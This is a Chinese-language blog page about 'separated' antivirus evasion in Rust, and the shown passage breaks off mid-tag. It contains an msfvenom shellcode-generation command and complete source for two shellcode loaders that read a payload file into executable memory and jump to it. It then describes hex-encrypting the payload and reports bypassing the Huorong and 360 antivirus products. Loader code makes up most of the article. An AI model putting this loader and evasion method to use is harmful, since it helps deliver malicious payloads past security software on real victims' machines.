@@ -1,0 +1,673 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/bitbug_favicon.ico">
+  <link rel="icon" href="/img/bitbug_favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="简介项目地址：GitHub - b1tg&#x2F;rs_shellcode: Another shellcode runner 🦀 🐚 12msfvenom -p windows&#x2F;x64&#x2F;exec CMD&#x3D;calc.exe  --platform win -f raw -o calc64.raw  项目源码 123456789101112131415161718192021222324252">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Rust 分离免杀">
+<meta property="og:url" content="http://example.com/2022/08/09/Rust%20%E5%85%8D%E6%9D%80%EF%BC%88%E5%88%86%E7%A6%BB%EF%BC%89/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="简介项目地址：GitHub - b1tg&#x2F;rs_shellcode: Another shellcode runner 🦀 🐚 12msfvenom -p windows&#x2F;x64&#x2F;exec CMD&#x3D;calc.exe  --platform win -f raw -o calc64.raw  项目源码 123456789101112131415161718192021222324252">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://static001.geekbang.org/infoq/94/948628cb165eb477f1b95db57f465002.jpeg">
+<meta property="article:published_time" content="2022-08-09T03:35:20.000Z">
+<meta property="article:modified_time" content="2023-11-26T13:06:31.193Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://static001.geekbang.org/infoq/94/948628cb165eb477f1b95db57f465002.jpeg">
+  
+  
+  
+  <title>Rust 分离免杀 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>追的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Rust 分离免杀"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-08-09 11:35" pubdate>
+          2022年8月9日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          61 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Rust 分离免杀</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/b1tg/rs_shellcode">GitHub - b1tg&#x2F;rs_shellcode: Another shellcode runner 🦀 🐚</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">msfvenom -<span class="hljs-selector-tag">p</span> windows/x64/exec CMD=calc<span class="hljs-selector-class">.exe</span>  <span class="hljs-attr">--platform</span> win -f raw -o calc64<span class="hljs-selector-class">.raw</span><br><br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1660548775653-3cbee06c-d0de-4e76-9779-7f87837a346b.png#averageHue=%23cfd9a5&clientId=ubf9f1965-b945-4&from=paste&height=656&id=u5e83d62c&originHeight=984&originWidth=2054&originalType=binary&ratio=1&rotation=0&showTitle=false&size=144006&status=done&style=none&taskId=u4112fa10-5bf1-404d-a3e8-b56e369580c&title=&width=1369.3333333333333" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>项目源码</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![feature(pattern)]</span><br><br><span class="hljs-comment">// #![windows_subsystem = &quot;windows&quot;]</span><br><span class="hljs-keyword">use</span> bindings::windows::win32::system_services::VirtualAlloc;<br><span class="hljs-keyword">use</span> clap::&#123;App, Arg&#125;;<br><span class="hljs-keyword">use</span> std::arch::asm;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> PAGE_EXECUTE_READWRITE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x40</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_COMMIT: <span class="hljs-type">u32</span> = <span class="hljs-number">0x1000</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_RESERVE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x2000</span>;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">matches</span> = App::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;rs_shellcode&quot;</span>)<br>        .<span class="hljs-title function_ invoke__">arg</span>(<br>            Arg::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;file&quot;</span>)<br>                .<span class="hljs-title function_ invoke__">short</span>(<span class="hljs-string">&#x27;f&#x27;</span>)<br>                .<span class="hljs-title function_ invoke__">about</span>(<span class="hljs-string">&quot;shellcode path&quot;</span>)<br>                .<span class="hljs-title function_ invoke__">takes_value</span>(<span class="hljs-literal">true</span>)<br>                .<span class="hljs-title function_ invoke__">required</span>(<span class="hljs-literal">true</span>),<br>        )<br>        .<span class="hljs-title function_ invoke__">arg</span>(<br>            Arg::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;breakpoint&quot;</span>)<br>                .<span class="hljs-title function_ invoke__">short</span>(<span class="hljs-string">&#x27;b&#x27;</span>)<br>                .<span class="hljs-title function_ invoke__">about</span>(<span class="hljs-string">&quot;set breakpoint in debugger&quot;</span>),<br>        )<br>        .<span class="hljs-title function_ invoke__">arg</span>(<br>            Arg::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;offset&quot;</span>)<br>                .<span class="hljs-title function_ invoke__">short</span>(<span class="hljs-string">&#x27;o&#x27;</span>)<br>                .<span class="hljs-title function_ invoke__">about</span>(<span class="hljs-string">&quot;shellcode offset&quot;</span>)<br>                .<span class="hljs-title function_ invoke__">takes_value</span>(<span class="hljs-literal">true</span>),<br>        )<br>        .<span class="hljs-title function_ invoke__">get_matches</span>();<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">set_breakpoint</span> = matches.<span class="hljs-title function_ invoke__">is_present</span>(<span class="hljs-string">&quot;breakpoint&quot;</span>);<br>    <span class="hljs-keyword">if</span> set_breakpoint &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[*] Breakpoint flag set!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">fp</span>: <span class="hljs-type">String</span> = matches.<span class="hljs-title function_ invoke__">value_of_t</span>(<span class="hljs-string">&quot;file&quot;</span>).<span class="hljs-title function_ invoke__">unwrap_or_else</span>(|e| e.<span class="hljs-title function_ invoke__">exit</span>());<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">offset</span>: <span class="hljs-type">u64</span> = <span class="hljs-keyword">match</span> matches.<span class="hljs-title function_ invoke__">value_of</span>(<span class="hljs-string">&quot;offset&quot;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">Some</span>(offset) =&gt; &#123;<br>            <span class="hljs-keyword">if</span> offset.<span class="hljs-title function_ invoke__">find</span>(<span class="hljs-string">&quot;0x&quot;</span>) == <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">let</span> <span class="hljs-variable">without_prefix</span> = offset.<span class="hljs-title function_ invoke__">trim_start_matches</span>(<span class="hljs-string">&quot;0x&quot;</span>);<br>                <span class="hljs-type">u64</span>::<span class="hljs-title function_ invoke__">from_str_radix</span>(without_prefix, <span class="hljs-number">16</span>).<span class="hljs-title function_ invoke__">unwrap_or</span>(<span class="hljs-number">0</span>)<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">u64</span>::<span class="hljs-title function_ invoke__">from_str_radix</span>(offset, <span class="hljs-number">10</span>).<span class="hljs-title function_ invoke__">unwrap_or</span>(<span class="hljs-number">0</span>)<br>            &#125;<br>        &#125;<br>        _ =&gt; <span class="hljs-number">0</span>,<br>    &#125;;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[*] Reading shellcode from path: &#123;:?&#125;&quot;</span>, fp.<span class="hljs-title function_ invoke__">clone</span>());<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">contents</span> = <span class="hljs-keyword">match</span> std::fs::<span class="hljs-title function_ invoke__">read</span>(fp) &#123;<br>        <span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br>        <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading shellcode error: &#123;&#125;&quot;</span>, e);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">flen</span> = contents.<span class="hljs-title function_ invoke__">len</span>();<br><br>    <span class="hljs-keyword">if</span> flen <span class="hljs-keyword">as</span> <span class="hljs-type">u64</span> &lt;= offset &#123;<br>        <span class="hljs-built_in">println!</span>(<br>            <span class="hljs-string">&quot;[-] Offset too big, offset: &#123;&#125;, file length: &#123;&#125;&quot;</span>,<br>            offset, flen<br>        );<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">new_buf</span> = <span class="hljs-keyword">unsafe</span> &#123;<br>        <span class="hljs-title function_ invoke__">VirtualAlloc</span>(<br>            std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>(),<br>            flen,<br>            MEM_COMMIT | MEM_RESERVE,<br>            PAGE_EXECUTE_READWRITE,<br>        )<br>    &#125;;<br>    <span class="hljs-keyword">if</span> new_buf == std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>() &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Failed to allocate memory&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">new_buf_ptr</span>: *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span> = new_buf <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span> <span class="hljs-keyword">as</span> _;<br>    <span class="hljs-keyword">unsafe</span> &#123; std::ptr::<span class="hljs-title function_ invoke__">copy_nonoverlapping</span>(contents.<span class="hljs-title function_ invoke__">as_ptr</span>(), new_buf_ptr, flen) &#125;;<br>    <span class="hljs-built_in">println!</span>(<br>        <span class="hljs-string">&quot;[*] Starting jmp to shellcode at offset 0x&#123;:x&#125; (base virtual address: &#123;:p&#125;)&quot;</span>,<br>        offset, new_buf_ptr<br>    );<br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">jmp_target</span> = new_buf.<span class="hljs-title function_ invoke__">offset</span>(offset <span class="hljs-keyword">as</span> <span class="hljs-type">isize</span>);<br>        <span class="hljs-keyword">if</span> set_breakpoint &#123;<br>            asm!(<span class="hljs-string">&quot;int 3&quot;</span>);<br>        &#125;<br>        asm!(<span class="hljs-string">&quot;jmp &#123;&#125;&quot;</span>,<span class="hljs-title function_ invoke__">in</span>(reg) jmp_target)<br>    &#125;;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p><strong>源码分析</strong></p>
+<blockquote>
+<p>matches 为命令行参数解释 clap模块</p>
+</blockquote>
+<p>set_breakpoint -b 参数 指定断点运行<br>fp 读取文件函数 -f<br>offset -o 指定偏移量</p>
+<p>contents <code>std::fs::read(fp)</code>将文件的全部内容读入字节向量。ok(res)<br>flen &#x3D; contents.len()  &#x2F;&#x2F;contents 长度</p>
+<p>new_buf 不安全的操作  通过virtualalloc 写入内存</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">VirtualAlloc</span>(<br>    lpaddress: <span class="hljs-type">Option</span>&lt;*<span class="hljs-keyword">const</span> c_void&gt;,<br>    dwsize: <span class="hljs-type">usize</span>,<br>    flallocationtype: VIRTUAL_ALLOCATION_TYPE,<br>    flprotect: PAGE_PROTECTION_FLAGS<br>) <span class="hljs-punctuation">-&gt;</span> *<span class="hljs-keyword">mut</span> c_void<br></code></pre></td></tr></table></figure>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-title function_ invoke__">VirtualAlloc</span>(<br>           std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>(), <span class="hljs-comment">//C端空指针</span><br>           flen,	<span class="hljs-comment">//contents长度</span><br>           MEM_COMMIT | MEM_RESERVE,<br>           PAGE_EXECUTE_READWRITE,<br>       )<br></code></pre></td></tr></table></figure>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> PAGE_EXECUTE_READWRITE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x40</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_COMMIT: <span class="hljs-type">u32</span> = <span class="hljs-number">0x1000</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_RESERVE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x2000</span>;<br></code></pre></td></tr></table></figure>
+<h2 id="自写（分离免杀）"><a href="#自写（分离免杀）" class="headerlink" title="自写（分离免杀）"></a>自写（分离免杀）</h2><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><strong>读取功能</strong></p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![feature(pattern)]</span><br><br><span class="hljs-comment">// #![windows_subsystem = &quot;windows&quot;]</span><br><span class="hljs-keyword">use</span> bindings::windows::win32::system_services::VirtualAlloc;<br><span class="hljs-keyword">use</span> std::arch::asm;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> PAGE_EXECUTE_READWRITE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x40</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_COMMIT: <span class="hljs-type">u32</span> = <span class="hljs-number">0x1000</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_RESERVE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x2000</span>;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">fp</span>: &amp;<span class="hljs-type">str</span> = <span class="hljs-string">&quot;calc64.raw&quot;</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">contents</span> = <span class="hljs-keyword">match</span> std::fs::<span class="hljs-title function_ invoke__">read</span>(fp) &#123;<br>        <span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br>        <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading Shellcode error: &#123;&#125;&quot;</span>,e);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">flen</span> = contents.<span class="hljs-title function_ invoke__">len</span>();<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;shellcode: &#123;:?&#125;&quot;</span>,contents);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;shellcode_len: &#123;&#125;&quot;</span>, flen);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><strong>内存加载</strong></p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">new_buf</span> = <span class="hljs-keyword">unsafe</span> &#123;<br>		<span class="hljs-title function_ invoke__">VirtualAlloc</span>(<br>			std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>(),<br>			flen,<br>			MEM_COMMIT | MEM_RESERVE,<br>			PAGE_EXECUTE_READWRITE,<br>		)<br>	&#125;;<br>	<span class="hljs-keyword">if</span> new_buf == std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>()&#123;<br>		<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Failed to allocate memory&quot;</span>);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br>	<span class="hljs-keyword">let</span> <span class="hljs-variable">new_buf_ptr</span>: *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span> = new_buf <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span> <span class="hljs-keyword">as</span> _;<br>	<span class="hljs-keyword">unsafe</span> &#123;std::ptr::<span class="hljs-title function_ invoke__">copy_nonoverlapping</span>(contents, new_buf_ptr, flen)&#125;;<br><br>	<span class="hljs-built_in">println!</span>(<br>		<span class="hljs-string">&quot;[*] Starting jmp to shellcode at offset 0x (base virtual address: &#123;:p&#125;)&quot;</span>,<br>		new_buf_ptr<br>	);<br><br>	<span class="hljs-keyword">unsafe</span> &#123;<br>		<span class="hljs-keyword">let</span> <span class="hljs-variable">jmp_target</span> = new_buf_ptr;<br>		<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>,jmp_target);<br><br>		asm!(<span class="hljs-string">&quot;jmp &#123;&#125;&quot;</span>,<span class="hljs-title function_ invoke__">in</span>(reg) jmp_target)<br>	&#125;;<br></code></pre></td></tr></table></figure>
+<p><strong>编译后进行测试</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669959935822-5bc5aca6-7259-4968-bd76-8c5e528c1a00.png#averageHue=%23b4bd72&clientId=u145b2b54-a9f6-4&from=paste&height=797&id=u9f1315ce&originHeight=1195&originWidth=2141&originalType=binary&ratio=1&rotation=0&showTitle=false&size=301737&status=done&style=none&taskId=ud0ce18c1-2d30-4ed2-a2d9-d3490671a6b&title=&width=1427.3333333333333" srcset="/img/loading.gif" lazyload alt="image.png"><br>文件被查杀</p>
+<h3 id="使用自写hex加密"><a href="#使用自写hex加密" class="headerlink" title="使用自写hex加密"></a>使用自写hex加密</h3><p>将raw文件进行加密<br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669960543345-a3e5d498-b8f5-4372-8b31-c24342b74ece.png#averageHue=%23f6f6f6&clientId=u145b2b54-a9f6-4&from=paste&height=615&id=u40b6bfb3&originHeight=923&originWidth=2034&originalType=binary&ratio=1&rotation=0&showTitle=false&size=235532&status=done&style=none&taskId=ua0e71bf9-2306-4a33-bf35-1060d3e0fc6&title=&width=1356" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="绕过效果"><a href="#绕过效果" class="headerlink" title="绕过效果"></a>绕过效果</h3><p><strong>火绒</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669963713362-c47619f8-4160-491a-aa91-9bc7437e9991.png#averageHue=%23ebe2d0&clientId=u145b2b54-a9f6-4&from=paste&height=637&id=u766524dd&originHeight=955&originWidth=2185&originalType=binary&ratio=1&rotation=0&showTitle=false&size=362509&status=done&style=none&taskId=u0e476163-29be-4032-9912-5f2d62b3a72&title=&width=1456.6666666666667" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669962749861-e074245d-924d-440a-bd0f-5a64c9c91c88.png#averageHue=%2366892c&clientId=u145b2b54-a9f6-4&from=paste&height=865&id=udb440559&originHeight=1298&originWidth=2539&originalType=binary&ratio=1&rotation=0&showTitle=false&size=306501&status=done&style=none&taskId=ua643fa57-8ab5-4885-97db-af80441b8b7&title=&width=1692.6666666666667" srcset="/img/loading.gif" lazyload alt="image.png"><br><strong>360</strong><br><img 